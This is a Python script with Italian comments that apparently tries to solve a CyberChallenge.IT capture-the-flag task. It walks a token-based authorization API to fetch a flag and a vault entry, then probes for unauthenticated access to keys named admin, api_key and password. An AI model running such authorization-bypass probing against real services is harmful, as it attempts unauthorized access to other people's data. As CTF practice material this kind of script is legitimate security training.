import requests
import sys
import time

# Informazioni target
hostname = "faas.challs.cyberchallenge.it"
app_id = "74be5421-b524-4b06-8ada-6c111324454b"
vault_id = "bdc3e1e0-fa24-48fe-9f96-3c5390dbd842"
flag_key = "flag"

base_url = f"http://{hostname}/api"

# Funzione per provare ad autorizzare l'app
def authorize_app(app_id):
    url = f"{base_url}/authorize/{app_id}"
    resp = requests.get(url).json()
    wait_token = resp.get('token')
    print(f"[+] Ottenuto wait token: {wait_token}")
    return wait_token

# Funzione per verificare se l'autorizzazione è stata concessa
def check_authorization(wait_token):
    url = f"{base_url}/get_refresh/{wait_token}"
    resp = requests.get(url).json()
    if 'status' in resp and resp['status'] == 'accepted':
        refresh_token = resp.get('token')
        print(f"[+] Autorizzazione accettata! Refresh token: {refresh_token}")
        return refresh_token
    else:
        print(f"[-] Autorizzazione non ancora concessa: {resp.get('status', 'unknown')}")
        return None

# Funzione per ottenere il token di autenticazione
def get_auth_token(refresh_token):
    url = f"{base_url}/refresh/{refresh_token}"
    resp = requests.get(url)
    if resp.status_code == 401:
        print("[-] Refresh token non valido")
        return None
    
    token_data = resp.json()
    auth_token = token_data.get('token')
    print(f"[+] Ottenuto auth token: {auth_token}")
    return auth_token

# Funzione per recuperare il valore di una chiave
def get_value(app_id, key, auth_token):
    url = f"{base_url}/get/{app_id}/{key}"
    headers = {'Auth': auth_token}
    resp = requests.get(url, headers=headers)
    
    if resp.status_code == 401:
        print("[-] Auth token non valido")
        return None
    
    data = resp.json()
    return data.get('data')

# Funzione per provare ad accedere anche al vault
def access_vault(vault_id, auth_token):
    url = f"{base_url}/get/{vault_id}/flag"
    headers = {'Auth': auth_token}
    try:
        resp = requests.get(url, headers=headers)
        if resp.status_code == 200:
            return resp.json().get('data')
        else:
            print(f"[-] Accesso al vault fallito: {resp.status_code}")
            return None
    except Exception as e:
        print(f"[-] Errore nell'accesso al vault: {str(e)}")
        return None

# Prova a sfruttare potenziali vulnerabilità

# 1. Tentativo di accesso diretto
print("[*] Tentativo di accesso diretto alla flag...")
try:
    direct_url = f"{base_url}/get/{app_id}/{flag_key}"
    resp = requests.get(direct_url)
    print(f"[*] Risposta: {resp.text}")
except Exception as e:
    print(f"[-] Errore: {str(e)}")

# 2. Tentativo di ottenere l'autorizzazione
print("\n[*] Richiedo autorizzazione per l'app...")
wait_token = authorize_app(app_id)

# 3. Verifica se l'autorizzazione è stata concessa
print("\n[*] Verifico se l'autorizzazione è stata concessa...")
refresh_token = check_authorization(wait_token)

if refresh_token:
    # 4. Ottenere il token di autenticazione
    auth_token = get_auth_token(refresh_token)
    
    if auth_token:
        # 5. Recupero della flag
        print("\n[*] Recupero della flag...")
        flag = get_value(app_id, flag_key, auth_token)
        print(f"[+] Flag ottenuta: {flag}")
        
        # 6. Prova ad accedere anche al vault
        print("\n[*] Provo ad accedere al vault...")
        vault_flag = access_vault(vault_id, auth_token)
        if vault_flag:
            print(f"[+] Flag dal vault: {vault_flag}")
else:
    print("\n[*] Attendo accettazione dell'autorizzazione...")
    attempts = 0
    while attempts < 10:
        time.sleep(5)
        refresh_token = check_authorization(wait_token)
        if refresh_token:
            auth_token = get_auth_token(refresh_token)
            if auth_token:
                flag = get_value(app_id, flag_key, auth_token)
                print(f"[+] Flag ottenuta: {flag}")
                
                vault_flag = access_vault(vault_id, auth_token)
                if vault_flag:
                    print(f"[+] Flag dal vault: {vault_flag}")
                break
        attempts += 1

# 7. Prova a indovinare altri token o bypass
print("\n[*] Provo a testare il bypass dell'autorizzazione...")
urls_to_test = [
    f"{base_url}/get/{vault_id}/{flag_key}",
    f"{base_url}/get/{app_id}/admin",
    f"{base_url}/get/{app_id}/api_key",
    f"{base_url}/get/{app_id}/password"
]

for url in urls_to_test:
    try:
        resp = requests.get(url)
        print(f"[*] Test {url}: {resp.status_code} - {resp.text[:100]}")
    except Exception as e:
        print(f"[-] Errore durante il test di {url}: {str(e)}") 